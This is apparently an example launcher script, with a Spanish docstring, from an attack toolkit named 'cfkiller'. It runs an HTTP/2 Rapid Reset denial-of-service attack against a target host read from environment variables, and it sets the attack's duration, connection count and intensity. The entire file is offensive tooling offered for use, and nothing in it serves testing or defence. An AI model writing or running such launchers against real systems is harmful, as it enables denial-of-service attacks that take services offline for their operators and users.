#!/usr/bin/env python3
"""Ejemplo de uso para lanzar RapidReset desde un script con parámetros en entorno o argumentos."""
import asyncio
import os
from cfkiller.core.http2.rapid_reset import RapidResetAttacker

def main():
    target = os.environ.get("TARGET") or "example.com"
    duration = int(os.environ.get("DURATION", 30))
    max_conn = int(os.environ.get("CONNECTIONS", 10))
    intensity = int(os.environ.get("INTENSITY", 200))

    attacker = RapidResetAttacker(host=target, duration=duration, max_connections=max_conn, intensity=intensity)
    asyncio.run(attacker.attack())

if __name__ == "__main__":
    main()
